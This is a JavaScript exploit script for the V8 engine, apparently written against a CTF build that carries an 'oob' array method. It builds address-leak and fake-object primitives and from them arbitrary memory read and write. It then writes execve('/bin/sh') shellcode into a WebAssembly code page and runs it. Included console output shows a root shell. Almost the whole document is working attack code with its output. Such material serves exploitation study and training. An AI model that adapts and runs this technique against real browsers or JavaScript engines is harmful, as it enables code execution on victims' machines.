const array_buffer = new ArrayBuffer(8);
let data_view = new DataView(array_buffer);

let u2d = (value) => {
    data_view.setBigUint64(0, value);
    return data_view.getFloat64(0);
};

let d2u = (value) => {
    data_view.setFloat64(0, value);
    return data_view.getBigUint64(0);
};

let hex = (value) => {
    return '0x' + value.toString(16).padStart(16, "0");
}

let test_value = 123n;
console.log("test_value", u2d(test_value), d2u(u2d(test_value)));

let obj = {};
let float_array = [1.1];
let obj_array = [obj];
//----oob() => map----
let float_array_map = float_array.oob();
let obj_array_map = obj_array.oob();
% DebugPrint(float_array);
% DebugPrint(obj_array);

console.log("float_array_map", hex(d2u(float_array_map)));
console.log("obj_array_map", hex(d2u(obj_array_map)));

let address_of = (obj) => {
    float_array.oob(obj_array_map);
    float_array[0] = obj;
    float_array.oob(float_array_map);
    return d2u(float_array[0]);
};

let fake_obj = (address) => {
    // obj_array.oob(float_array_map);
    // obj_array[0] = u2d(address | 1n);
    // obj_array.oob(obj_array_map);
    // return obj_array[0];
    float_array.oob(float_array_map);
    float_array[0] = u2d(address | 1n);
    float_array.oob(obj_array_map);
    return float_array[0];
};

let float_array_mem = [
    float_array_map,
    u2d(0n),
    u2d(0xdeadbeefn),
    u2d(1n << 32n),
];
let fake_float_array = fake_obj(address_of(float_array_mem) + 0x30n);

let read = (address) => {
    float_array_mem[2] = u2d((address - 0x10n) | 1n);
    return d2u(fake_float_array[0]);
};
let write = (address, value) => {
    float_array_mem[2] = u2d((address - 0x10n) | 1n);
    fake_float_array[0] = u2d(value);
};

let array_buffer1 = new ArrayBuffer(0x8);
let data_view1 = new DataView(array_buffer1);
let array_buffer2 = new ArrayBuffer(0x1000);
let data_view2 = new DataView(array_buffer2);

% DebugPrint(array_buffer1);
% DebugPrint(array_buffer2);

write(address_of(array_buffer1) + 0x20n, address_of(array_buffer2) + 0x20n - 0x1n);
// % SystemBreak();
/**
 0x33a6ed18ea81 <JSArray[1]>
 0x33a6ed18eab9 <JSArray[1]>
 float_array_map 0x00000e52e5d82ed9
 obj_array_map 0x00000e52e5d82f79
 0x33a6ed18ef79 <ArrayBuffer map = 0xe52e5d821b9>
 0x33a6ed18eff9 <ArrayBuffer map = 0xe52e5d821b9>
 */

let ab_read = (address) => {
    data_view1.setBigUint64(0, address, true);
    return data_view2.getBigUint64(0, true);
};

let ab_write = (address, value) => {
    data_view1.setBigUint64(0, address, true);
    data_view2.setBigUint64(0, value, true);
};

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
let main = wasm_mod.exports.main;

let main_addr = ab_read((address_of(wasm_mod) & ~1n) + 0x88n);
console.log("main_addr", hex(main_addr));
% DebugPrint(wasm_mod);

let shellcode = [
    0x48n, 0x31n, 0xC0n, 0x50n, 0x48n, 0xBFn, 0x2Fn, 0x62n, 0x69n, 0x6En, 0x2Fn, 0x73n,
    0x68n, 0x00n, 0x57n, 0x48n, 0x89n, 0xE7n, 0x48n, 0x31n, 0xC0n, 0xB8n, 0x3Bn, 0x00n,
    0x00n, 0x00n, 0x48n, 0x31n, 0xF6n, 0x48n, 0x31n, 0xD2n, 0x0Fn, 0x05n, 0x48n, 0x31n,
    0xC0n, 0x48n, 0x31n, 0xFFn, 0x0Fn, 0x05n
];
/*
F:\tmp\20250302\sc1 (2025/3/2 21:07:47)
   起始位置(h): 00001000, 结束位置(h): 00001029, 长度(h): 0000002A

   unsigned char rawData[42] = {
    0x48, 0x31, 0xC0, 0x50, 0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73,
    0x68, 0x00, 0x57, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xC0, 0xB8, 0x3B, 0x00,
    0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x0F, 0x05, 0x48, 0x31,
    0xC0, 0x48, 0x31, 0xFF, 0x0F, 0x05
};

 */
for (let i = 0; i < shellcode.length; i++) {
    ab_write(main_addr + BigInt(i) * 1n, shellcode[i]);
}

main();
/**
test_value 6.1e-322 123
0x056882f50a79 <JSArray[1]>
0x056882f50ab1 <JSArray[1]>
float_array_map 0x000015ee91282ed9
obj_array_map 0x000015ee91282f79
0x056882f50f41 <ArrayBuffer map = 0x15ee912821b9>
0x056882f50fc1 <ArrayBuffer map = 0x15ee912821b9>
main_addr 0x00003a3a5bf80000
0x3d6878f219d9 <Instance map = 0x15ee91289789>
$ ls
args.gn  build.ninja  build.ninja.d  bytecode_builtins_list_generator  d8  exp.js  gen  gen-regexp-special-case  icudtl.dat  mksnapshot  natives_blob.bin  obj  sc1  sc1.asm  sc1.o  snapshot_blob.bin  toolchain.ninja  torque  v8_build_config.json
$ whoami
root
 */
// % SystemBreak();
/**
 * r --allow-natives-syntax --shell ../exp/exp4_wasm.js
 */